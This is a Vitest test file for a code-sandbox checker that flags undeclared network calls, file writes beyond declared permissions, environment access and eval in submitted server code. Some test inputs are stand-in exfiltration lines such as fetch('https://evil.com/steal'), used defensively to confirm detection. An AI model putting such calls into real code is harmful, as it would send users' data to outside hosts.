import { describe, it, expect } from 'vitest';
import { runSandbox } from '../../src/sandbox/index.js';
import type { SandboxInput } from '../../src/sandbox/types.js';

describe('runSandbox', () => {
  it('passes sandbox for clean code', async () => {
    const input: SandboxInput = {
      serverId: 'test-server',
      sourceCode: 'const x = 1;\nconsole.log(x);',
    };
    const result = await runSandbox(input);
    expect(result.status).toBe('sandbox_passed');
  });

  it('fails sandbox for undeclared URL', async () => {
    const input: SandboxInput = {
      serverId: 'test-server',
      sourceCode: `fetch('https://evil.com/steal');`,
    };
    const result = await runSandbox(input);
    expect(result.status).toBe('sandbox_failed');
    expect(result.violations!.some((v) => v.type === 'undeclared_url')).toBe(true);
  });

  it('fails sandbox for readonly with fs writes', async () => {
    const input: SandboxInput = {
      serverId: 'test-server',
      sourceCode: `fs.writeFileSync('/tmp/out.txt');`,
    };
    const result = await runSandbox(input);
    expect(result.status).toBe('sandbox_failed');
  });

  it('populates behaviorTrace in result', async () => {
    const input: SandboxInput = {
      serverId: 'test-server',
      sourceCode: `fetch('https://api.example.com/data');\nprocess.env.NODE_ENV;`,
    };
    const result = await runSandbox(input);
    expect(result.behaviorTrace).toBeDefined();
    expect(result.behaviorTrace!.networkCalls).toHaveLength(1);
    expect(result.behaviorTrace!.envAccess).toHaveLength(1);
  });

  it('populates violations in result', async () => {
    const input: SandboxInput = {
      serverId: 'test-server',
      sourceCode: `fetch('https://evil.com/steal');`,
    };
    const result = await runSandbox(input);
    expect(result.violations).toBeDefined();
    expect(result.violations!.length).toBeGreaterThan(0);
  });

  it('returns sandbox_passed when only warnings exist', async () => {
    const input: SandboxInput = {
      serverId: 'test-server',
      sourceCode: `const key = process.env.API_KEY;`,
      declaredPermissions: 'full_write',
    };
    const result = await runSandbox(input);
    // API_KEY is sensitive (warn), but no fail-severity violations
    expect(result.status).toBe('sandbox_passed');
    expect(result.violations!.some((v) => v.severity === 'warn')).toBe(true);
  });

  it('returns sandbox_failed when any fail-severity violation exists', async () => {
    const input: SandboxInput = {
      serverId: 'test-server',
      sourceCode: `eval('malicious code');`,
    };
    const result = await runSandbox(input);
    expect(result.status).toBe('sandbox_failed');
    expect(result.violations!.some((v) => v.severity === 'fail')).toBe(true);
  });

  it('returns durationMs as a number >= 0', async () => {
    const input: SandboxInput = {
      serverId: 'test-server',
      sourceCode: 'const x = 1;',
    };
    const result = await runSandbox(input);
    expect(typeof result.durationMs).toBe('number');
    expect(result.durationMs).toBeGreaterThanOrEqual(0);
  });

  it('defaults declaredPermissions to readonly', async () => {
    const input: SandboxInput = {
      serverId: 'test-server',
      sourceCode: `fs.writeFileSync('/tmp/out.txt');`,
      // no declaredPermissions - should default to readonly
    };
    const result = await runSandbox(input);
    expect(result.status).toBe('sandbox_failed');
    expect(result.violations!.some((v) => v.type === 'permission_exceeded')).toBe(true);
  });

  it('passes sandbox for empty source code', async () => {
    const input: SandboxInput = {
      serverId: 'test-server',
      sourceCode: '',
    };
    const result = await runSandbox(input);
    expect(result.status).toBe('sandbox_passed');
    expect(result.violations).toHaveLength(0);
  });

  it('passes sandbox when URLs are declared', async () => {
    const input: SandboxInput = {
      serverId: 'test-server',
      sourceCode: `fetch('https://api.example.com/data');`,
      declaredExternalUrls: ['https://api.example.com/'],
    };
    const result = await runSandbox(input);
    expect(result.status).toBe('sandbox_passed');
  });

  it('includes details message with violation count on failure', async () => {
    const input: SandboxInput = {
      serverId: 'test-server',
      sourceCode: `fetch('https://evil.com/a');\nfetch('https://evil2.com/b');`,
    };
    const result = await runSandbox(input);
    expect(result.details).toContain('violation');
    expect(result.details).toContain('undeclared_url');
  });
});
